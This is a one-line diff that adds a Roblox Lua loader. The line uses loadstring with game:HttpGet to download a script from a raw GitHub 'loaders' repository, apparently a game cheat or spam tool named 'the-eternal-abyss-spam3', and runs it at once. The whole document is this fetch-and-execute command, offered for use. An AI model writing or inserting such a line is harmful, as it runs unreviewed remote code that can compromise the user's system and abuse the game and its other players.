@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/the-eternal-abyss-spam3-hv1e6bujm5o7j3.lua"))()
